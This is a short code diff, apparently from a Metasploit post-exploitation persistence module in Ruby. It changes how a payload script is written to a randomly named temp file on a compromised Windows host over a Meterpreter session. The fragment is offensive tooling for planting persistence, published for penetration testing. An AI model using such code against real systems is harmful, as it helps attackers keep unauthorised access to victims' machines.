@@ -51,7 +51,7 @@ meter_type = client.platform
     tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + "." + ext
     #print_good(tempdir +" "+ tempfile)
     begin
-      write_file(tempfile, payloadsource)
+      session.fs.file.upload_file(tempfile, payloadsource)
       print_good("Persistent Script written to #{tempfile}")
       tempfile = tempfile.gsub(/\\/, '\\')      # Escape windows pathname separators.
     rescue
